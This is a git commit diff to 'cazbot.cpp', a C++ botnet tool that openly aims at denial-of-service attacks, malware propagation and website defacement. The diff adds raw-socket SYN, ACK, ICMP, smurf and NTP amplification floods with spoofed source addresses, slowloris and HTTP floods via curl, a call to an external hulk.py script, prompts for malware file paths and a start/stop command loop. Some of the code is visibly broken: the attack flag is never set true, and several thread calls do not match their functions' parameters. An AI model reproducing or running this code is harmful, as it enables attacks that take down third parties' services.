92abb8e42f632be3faeb8b30e6e0eb71b369ad8b
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-23 23:23:34 -0800

    Update cazbot.cpp

--- cazbot.cpp
+++ cazbot.cpp
@@ -13,8 +13,8 @@
 #include <netinet/tcp.h>
 #include <sys/socket.h>
 
-#define PACKET_SIZE 4096
-#define MAX_BOTNETS 1000
+#define PACKET_SIZE 8192
+#define MAX_BOTNETS 10000
 
 using namespace std;
 
@@ -24,6 +24,10 @@ string targetWebsite;
 string defaceHTML;
 string malwarePHP;
 string malwarePayload;
+string malwareJS;
+string malwarePython; 
+
+bool attackRunning = false;
 
 void udpFlood(string ip, int port) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -35,8 +39,9 @@ void udpFlood(string ip, int port) {
     char packet[PACKET_SIZE];
     memset(packet, 'A', sizeof(packet));
 
-    while (true) {
+    while (attackRunning) {
         sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
     }
 }
 
@@ -47,11 +52,12 @@ void tcpFlood(string ip, int port) {
     destAddr.sin_port = htons(port);
     inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
 
-    while (true) {
+    while (attackRunning) {
         if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
             shutdown(sockfd, SHUT_RDWR);
             sockfd = socket(AF_INET, SOCK_STREAM, 0);
         }
+        usleep(1); 
     }
 }
 
@@ -87,7 +93,25 @@ void startAttack() {
         thread(udpFlood, ip, targetPort).detach();
         thread(tcpFlood, ip, targetPort).detach();
         thread(propagateMalware, ip).detach();
+        thread(synFlood, ip, targetPort).detach();
+        thread(httpFlood, ip, targetPort).detach();
+        thread(icmpFlood, ip, targetPort).detach();
+        thread(ackFlood, ip, targetPort).detach();
+        thread(volumetricAttack, ip, targetPort).detach();
+        thread(smurfAttack, ip, targetPort).detach();
+        thread(sslTlsAttack, ip, targetPort).detach();
+        thread(httpGetRequest, ip, targetPort).detach();
+        thread(protocolAttack, ip, targetPort).detach();
+        thread(ipNullAttack, ip, targetPort).detach();
+        thread(ntpAmplificationAttack, ip, targetPort).detach();
+        thread(pingOfDeath, ip, targetPort).detach();
+        thread(slowlorisAttack, ip, targetPort).detach();
+        thread(hulkFlood, ip, targetPort).detach();
     }
+}
+
+void stopAttack() {
+    attackRunning = false;
 }
 
 void defaceWebsite() {
@@ -112,6 +136,302 @@ string generateMalwarePayload() {
     return payload;
 }
 
+void synFlood(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    struct iphdr *iph = (struct iphdr*)packet;
+    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    iph->id = htons(12345);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0;
+    iph->saddr = inet_addr("1.2.3.4");
+    iph->daddr = destAddr.sin_addr.s_addr;
+
+    tcph->source = htons(12345);
+    tcph->dest = destAddr.sin_port;
+    tcph->seq = random() % 900000000 + 100000000;
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->syn = 1;
+    tcph->window = htons(65535);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+
+    iph->check = csum((unsigned short*)packet, iph->tot_len);
+    tcph->check = csum((unsigned short*)tcph, sizeof(struct tcphdr));
+
+    while (true) {
+        sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void httpFlood(string url) {
+    while (true) {
+        system(("curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' -X GET '" + url + "' >/dev/null").c_str());
+        usleep(1); 
+    }
+}
+
+void icmpFlood(string ip) {
+    while (true) {
+        system(("ping -c 1 -s 65507 " + ip + " >/dev/null").c_str());
+        usleep(1); 
+    }
+}
+
+void ackFlood(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    struct iphdr *iph = (struct iphdr*)packet;
+    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    iph->id = htons(12345);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0;
+    iph->saddr = inet_addr("1.2.3.4");
+    iph->daddr = destAddr.sin_addr.s_addr;
+
+    tcph->source = htons(12345);
+    tcph->dest = destAddr.sin_port;
+    tcph->seq = random() % 900000000 + 100000000;
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->ack = 1;
+    tcph->window = htons(65535);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+
+    iph->check = csum((unsigned short*)packet, iph->tot_len);
+    tcph->check = csum((unsigned short*)tcph, sizeof(struct tcphdr));
+
+    while (true) {
+        sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void volumetricAttack(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 'A', sizeof(packet));
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void smurfAttack(string ip) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = 0;
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    struct icmphdr *icmph = (struct icmphdr*)packet;
+
+    icmph->type = ICMP_ECHO;
+    icmph->code = 0;
+    icmph->checksum = 0;
+    icmph->un.echo.id = htons(getpid());
+    icmph->un.echo.sequence = 0;
+
+    icmph->checksum = csum((unsigned short*)packet, sizeof(struct icmphdr));
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void sslTlsAttack(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
+        string request = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: Upgrade\r\nUpgrade: TLS/1.2, HTTP/1.1\r\n\r\n";
+        send(sockfd, request.c_str(), request.length(), 0);
+    }
+    close(sockfd);
+}
+
+void httpGetRequest(string url) {
+    while (true) {
+        system(("curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' -X GET '" + url + "' >/dev/null").c_str());
+        usleep(1); 
+    }
+}
+
+void protocolAttack(string ip) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = 0;
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void ipNullAttack(string ip) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = 0;
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void ntpAmplificationAttack(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    struct udphdr *udph = (struct udphdr*)packet;
+
+    udph->source = htons(port);
+    udph->dest = htons(123);
+    udph->len = htons(512);
+    udph->check = 0;
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void pingOfDeath(string ip) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = 0;
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    char packet[PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+
+    struct icmphdr *icmph = (struct icmphdr*)packet;
+
+    icmph->type = ICMP_ECHO;
+    icmph->code = 0;
+    icmph->checksum = 0;
+    icmph->un.echo.id = htons(getpid());
+    icmph->un.echo.sequence = 0;
+
+    icmph->checksum = csum((unsigned short*)packet, sizeof(struct icmphdr));
+
+    while (true) {
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
+        usleep(1); 
+    }
+}
+
+void slowlorisAttack(string ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    while (true) {
+        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
+            string request = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: keep-alive\r\n";
+            send(sockfd, request.c_str(), request.length(), 0);
+            this_thread::sleep_for(chrono::seconds(10));
+        }
+        usleep(1); 
+    }
+}
+
+void hulkFlood(string url) {
+    while (true) {
+        system(("python3 hulk.py -t " + url).c_str());
+        usleep(1); 
+    }
+}
+
+void runPythonMalware() {
+    system(("python3 " + malwarePython).c_str());
+}
+
+void processCommand(string command) {
+    if (command == "start") {
+        if (!attackRunning) {
+            cout << "Starting the DDoS attack and malware propagation..." << endl;
+            startAttack();
+            cout << "Attack started!" << endl;
+        } else {
+            cout << "The attack is already running." << endl;
+        }
+    } else if (command == "stop") {
+        if (attackRunning) {
+            cout << "Stopping the attack..." << endl;
+            stopAttack();
+            cout << "Attack stopped." << endl;
+        } else {
+            cout << "The attack is not currently running." << endl;
+        }
+    } else {
+        cout << "Invalid command. Please enter either 'start' or 'stop'." << endl;
+    }
+}
+
 int main() {
     cout << "Enter the target website URL: ";
     cin >> targetWebsite;
@@ -126,23 +446,24 @@ int main() {
     cout << "Enter the path to the PHP file for the malware: ";
     getline(cin, malwarePHP);
 
+    cout << "Enter the path to the JavaScript file for the malware: ";
+    getline(cin, malwareJS);
+
+    cout << "Enter the path to the Python malware file: ";
+    getline(cin, malwarePython);
+
     malwarePayload = generateMalwarePayload();
 
     generateIPs();
 
     cout << "Botnet IPs generated: " << botnetIPs.size() << endl;
 
-    cout << "Starting the DDoS attack and malware propagation..." << endl;
-    startAttack();
-
-    cout << "Attack started! To stop the attack, press Ctrl + C." << endl;
-
-    // Wait for the user to stop the attack
-
-    cout << "Defacing the target website..." << endl;
-    defaceWebsite();
-
-    cout << "Website defaced successfully!" << endl;
+    while (true) {
+        string command;
+        cout << "Enter a command ('start' or 'stop'): ";
+        cin >> command;
+        processCommand(command);
+    }
 
     return 0;
 }
